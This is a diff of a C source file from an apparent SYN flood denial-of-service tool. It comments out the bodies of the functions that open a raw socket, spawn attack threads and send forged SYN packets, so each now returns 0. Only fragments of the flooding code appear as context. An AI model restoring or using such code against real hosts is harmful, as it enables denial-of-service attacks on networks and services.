@@ -22,7 +22,6 @@
 #include <signal.h>
 
 #include "syn_flood.h"
-#include "../debug.h"
 #include "../main.h"
 
 //int attack(const struct AHTTP_INPUT *ainput)
@@ -31,6 +30,7 @@ static int SendSYN(const pSynFloodSt syn_st)
     // start attack now
     // create a raw socke
     // the program must run as root
+    /*
     int socket_fd = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
     if (socket_fd < 0)
     {
@@ -174,6 +174,7 @@ static int SendSYN(const pSynFloodSt syn_st)
         }
     }
     close(socket_fd);
+    */
 
     return 0;
 }
@@ -181,6 +182,7 @@ static int SendSYN(const pSynFloodSt syn_st)
 static void FreeSYNStructBuff(pSYNStruct input)
 {
     // free the structure
+    /*
     if (input)
     {
         if (input->dst_ip)
@@ -189,11 +191,12 @@ static void FreeSYNStructBuff(pSYNStruct input)
         }
         free(input);
     }
+    */
 }
 
 static int _AttackThread(pParameter parameter)
 {
-
+    /*
     pSynFloodSt syn_flood_st = (pSynFloodSt)malloc(sizeof(SynFloodSt));
     parameter->_syn_flood_st = syn_flood_st;
     int i;
@@ -253,13 +256,14 @@ static int _AttackThread(pParameter parameter)
     }
     FreeRandomIPBuff(syn_struct->src_ip);
     FreeSYNStructBuff(syn_struct);
+    */
     return 0;
 }
 
 int StartSYNFloodAttack(const pParameter parameter)
 {
     /* run this program as root */
-
+    /*
     pthread_t tid[parameter->thread_num];
     pthread_attr_t attr;
     int j, ret;
@@ -322,7 +326,7 @@ int StartSYNFloodAttack(const pParameter parameter)
             pthread_join(tid[j], NULL);
         }
     }
-
+    */
     return 0;
 }
 
